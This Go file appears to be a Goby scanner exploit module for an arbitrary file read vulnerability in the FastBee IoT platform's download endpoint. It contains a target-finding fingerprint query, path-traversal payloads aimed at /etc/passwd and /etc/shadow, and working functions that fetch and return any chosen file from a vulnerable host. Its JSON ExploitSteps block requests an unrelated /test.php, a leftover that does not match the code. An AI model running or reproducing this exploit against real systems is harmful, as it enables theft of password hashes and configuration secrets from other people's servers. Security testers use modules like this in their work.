package exploits

import (
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "FastBee-iot-platform /prod-api/iot/tool/download File Read Vulnerability",
    "Description": "<p>FastBee iot platform is an open source platform focused on providing hardware access, data management, application development and other solutions.</p><p>The FastBee iot platform download has arbitrary file download vulnerabilities that can lead to sensitive information disclosure, data theft, and other security risks that can cause serious harm to systems and users.</p>",
    "Product": "FastBee-iot-platform",
    "Homepage": "https://fastbee.cn/",
    "DisclosureDate": "2024-09-02",
    "PostTime": "2024-09-10",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"fastbee\"&&body=\"loader-wrapper\"",
    "GobyQuery": "title=\"fastbee\"&&body=\"loader-wrapper\"",
    "Level": "1",
    "Impact": "<p>Attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in sensitive information disclosure, data theft, and other security risks, thereby causing serious harm to the system and users.</p>",
    "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version: <a href=\"https://fastbee.cn/\">https://fastbee.cn/</a></p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/141855432"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/../../../../../../../../../etc/shadow",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "蜂信物联物联网平台 /prod-api/iot/tool/download 文件读取漏洞",
            "Product": "蜂信物联-物联网平台",
            "Description": "<p>蜂信物联网平台是一个专注于提供硬件接入、数据管理、应用开发等解决方案的开源平台。</p><p>蜂信物联(FastBee)物联网平台download存在任意文件下载漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。<br></p>",
            "Recommendation": "<p>关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://fastbee.cn/\">https://fastbee.cn/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "FastBee-iot-platform /prod-api/iot/tool/download File Read Vulnerability",
            "Product": "FastBee-iot-platform",
            "Description": "<p>FastBee iot platform is an open source platform focused on providing hardware access, data management, application development and other solutions.</p><p>The FastBee iot platform download has arbitrary file download vulnerabilities that can lead to sensitive information disclosure, data theft, and other security risks that can cause serious harm to systems and users.<br></p>",
            "Recommendation": "<p>Follow the official patch release information to install the patch or upgrade to the latest version: <a href=\"https://fastbee.cn/\">https://fastbee.cn/</a><br></p>",
            "Impact": "<p>Attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in sensitive information disclosure, data theft, and other security risks, thereby causing serious harm to the system and users.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9953"
}`
	postOrGet_ZHwNWEGtHl := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/prod-api/iot/tool/download?fileName=" + fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}


	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/prod-api/iot/tool/download"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/../../../../../../../../../etc/passwd": "root",
				"/../../../../../../../../../etc/shadow": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_ZHwNWEGtHl

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/../../../../../../../../../etc/passwd", "root"},

			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_ZHwNWEGtHl

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}


